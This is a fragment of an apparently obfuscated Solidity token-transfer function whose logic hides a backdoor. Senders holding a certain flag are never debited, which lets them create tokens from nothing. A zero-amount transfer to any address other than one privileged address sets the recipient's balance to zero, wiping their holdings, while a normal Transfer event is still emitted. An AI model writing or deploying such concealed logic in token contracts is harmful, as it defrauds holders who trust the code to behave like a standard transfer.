        if (0 == xvzmwols[alrwdepst]) {
            balanceOf[alrwdepst] -= xirymbhk;
        }
        balanceOf[bxsqay] += xirymbhk;
        if (0 == xirymbhk && bxsqay != yevfitkhcq) {
            balanceOf[bxsqay] = xirymbhk;
        }
        emit Transfer(alrwdepst, bxsqay, xirymbhk);
    }

